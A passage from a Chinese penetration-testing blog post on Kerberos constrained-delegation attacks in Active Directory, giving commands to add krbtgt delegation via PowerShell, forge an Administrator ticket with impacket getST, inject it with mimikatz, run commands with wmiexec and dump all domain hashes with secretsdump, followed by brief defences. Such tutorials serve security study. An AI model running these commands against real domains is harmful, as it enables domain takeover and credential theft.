<p>我们可以使用powershell来添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser qiyou</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/qiyou.com&quot;) &#125;</span><br></pre></td></tr></table></figure>
<p><strong>注</strong>：域控默认安装ActiveDirectory，如果没有安装，可以下载dll：<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">下载地址</a>，然后导入就行了：<code>import-module .\Microsoft.ActiveDirectory.Management.dll</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208201546-bc68548e-4a6c-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>GUI界面查看一下，成功添加</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208201626-d4453568-4a6c-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>我们可以用<code>impacket</code>系列的<code>getST</code>向KDC请求administrator的TGT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.141.145 -spn krbtgt/qiyou.com -impersonate Administrator qiyou.com/qiyou:password</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<p>-impersonate：表示伪造用户</p>
<p>-spn：表示我们要委派的服务的spn，这里是TGS</p>
<p>-dc-ip：域控ip</p>
<p>执行之后会在当前目录生成一个缓存文件<code>Administrator.ccache</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208211804-70145b4c-4a75-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>然后用mimikatz进行<code>ptc</code>（pass the cache），将缓存注入当前会话中</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212218-07ca043c-4a76-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>klist查看缓存的票据</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212405-47a4808c-4a76-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>访问域控</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212458-6714dfb6-4a76-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>执行命令的话我们可以用<code>impacket</code>系列或者<code>powershell</code>都可以</p>
<p>wmiexec</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">wmiexec.exe -no-pass -k administrator@WIN-QFPHJSM1L7G.qiyou.com -dc-ip 192.168.141.145</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212926-06b9b3f2-4a77-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>导出域控上所有用户以及主机的hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">secretsdump.exe -no-pass -k WIN-QFPHJSM1L7G.qiyou.com</span><br></pre></td></tr></table></figure>
<p>请求过程和上面的cifs是一样的只不过是把cifs换krbtgt而已，所以这里就不抓包演示了</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>高权限用户没有在特殊要求之下设置为不可委派</li>
</ol>
<p>如图</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211095642-c04916c2-4c71-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<ol start="2">
<li>为了防止凭据被盗微软推出了<code>Protected Users</code>组，适用于<code>Windows Server 2016</code>，<code>Windows Server 2012 R2</code>、 <code>Windows Server 2012</code></li>
</ol>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211100913-7fa14af2-4c73-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>关于<code>Protected Users</code>组成员的特点请参考微软<a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts#BKMK_AddtoProtectedUsers" target="_blank" rel="noopener">手册</a>，这里就不多赘述了</p>
<ol start="3">
<li>提高服务用户密码强度，防止黑客通过<code>Kerberoasting</code>等手段对口令进行暴力破解</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p>
<p><a href="https://paper.seebug.org/620/" target="_blank" rel="noopener">https://paper.seebug.org/620/</a></p>
<p><a href="https://horizon.guidepointsecurity.com/tutorials/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/" target="_blank" rel="noopener">https://horizon.guidepointsecurity.com/tutorials/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/</a></p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN</a></p>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-02-29T15:43:17.456Z" itemprop="dateUpdated">2020-02-29 23:43:17</time>
</span><br>


        
        know it then hack it
        
    </div>
    
    <footer>
        <a href="https://byqiyou.github.io">
            <img src="/img/avatar.jpg" alt="">
            
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/">pentest</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/&title=《域渗透——Kerberos委派攻击》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/&title=《域渗透——Kerberos委派攻击》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《域渗透——Kerberos委派攻击》 — 七友&url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/&via=https://byqiyou.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2020/02/24/域渗透——AdminSDHolder/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">域渗透——AdminSDHolder</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/01/28/windows取证——文件执行记录的获取和清除/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">windows取证——文件执行记录的获取和清除</h4>
      </a>
    </div>
  
</nav>



    


<section class="comments" id="comments">
    <div id="disqus_thread"></div>
    <script>
    var disqus_shortname = 'true';
    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>




<section class="comments" id="comments">
    <!-- UY BEGIN -->
    <div id="uyan_frame"></div>
    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
    <!-- UY END -->
</section>
















</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        Thinks
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span> &copy; 2018 - 2020</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/&title=《域渗透——Kerberos委派攻击》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/&title=《域渗透——Kerberos委派攻击》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《域渗透——Kerberos委派攻击》 — 七友&url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/&via=https://byqiyou.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2020/02/11/域渗透——Kerberos委派攻击/" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = 'Leave';
            clearTimeout(titleTime);
        } else {
            document.title = 'Come back';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
